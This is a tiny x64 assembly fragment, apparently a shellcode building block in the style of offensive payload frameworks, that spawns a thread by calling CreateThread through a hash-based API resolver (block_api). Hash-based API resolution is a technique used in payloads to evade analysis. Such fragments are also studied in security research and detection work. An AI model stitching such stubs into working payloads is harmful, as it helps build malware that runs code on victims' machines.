; Creates a Thread
;  rbp: -> block_api
;  r8: start addr
;  r9: -> param
;  

[BITS 64]
    
    xor rcx, rcx
    mov rdx, rcx
    ; from initial args
    times 2 push rcx
    mov r10d, 0x160D6838    ; hash( "kernel32.dll", "CreateThread" )
    call rbp
    add rsp, 40
